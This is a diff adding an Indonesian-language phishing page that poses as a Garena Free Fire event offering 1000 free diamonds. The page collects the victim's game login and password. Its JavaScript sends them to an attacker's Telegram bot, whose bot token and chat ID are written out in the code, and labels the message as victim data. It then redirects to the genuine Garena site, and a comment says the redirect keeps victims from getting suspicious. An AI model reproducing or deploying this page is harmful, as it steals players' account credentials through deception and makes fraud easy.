@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Fire Diamond Gratis - Garena Event</title>
+    <style>
+        body { font-family: Arial; background: #0a1c30; color: white; text-align: center; padding: 20px; }
+        .box { background: #1a2c4d; width: 300px; margin: auto; padding: 20px; border-radius: 10px; }
+        input { width: 90%; padding: 10px; margin: 10px; border-radius: 5px; border: none; }
+        button { background: #f7a731; color: black; padding: 10px 20px; border: none; border-radius: 5px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>🔥 EVENT HARIAN FREE FIRE 🔥</h1>
+    <h3>Klaim 1000 Diamond + Skin Elite Pass!</h3>
+    
+    <div class="box">
+        <p>Masukkan data akun FF Anda:</p>
+        <input type="text" id="login" placeholder="ID/Email/No HP" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="sendToTelegram()">KLIM SEKARANG</button>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            const botToken = "8579763861:AAGVPAdYGD3vpvoThbI02IzDAqxx5Xdd_mY"; // Contoh: 123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+            const chatId = "8085331589"; // Contoh: 1234567890
+            const login = document.getElementById("login").value;
+            const password = document.getElementById("password").value;
+            
+            const message = `📌 DATA KORBAN FF 📌\n\n🔑 Login: ${login}\n🔒 Password: ${password}\n\n🚀 Dari: ${window.location.href}`;
+            
+            // Kirim via Telegram Bot API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(() => {
+                    window.location.href = "https://ff.garena.com/"; // Redirect biar korban gak curiga
+                });
+        }
+    </script>
+</body>
+</html>
